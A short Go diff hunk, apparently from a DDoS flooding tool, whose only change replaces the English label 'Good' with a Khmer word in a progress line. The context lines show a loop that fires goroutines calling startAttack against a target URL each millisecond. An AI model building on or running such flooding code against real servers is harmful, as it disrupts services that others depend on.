@@ -39,7 +39,7 @@ func main() {
 		rand.Seed(time.Now().UnixNano())
 		for i := 0; i < *count; i++ {
 			if i%4 == 0 {
-				fmt.Println("ddos Attack  :", i, "Good:", completeCount, "CAT😼:", errorCount)
+				fmt.Println("ddos Attack  :", i, "ល្អ:", completeCount, "CAT😼:", errorCount)
 			}
 			go startAttack(*attackUrl, *method, data)
 			time.Sleep(time.Millisecond)
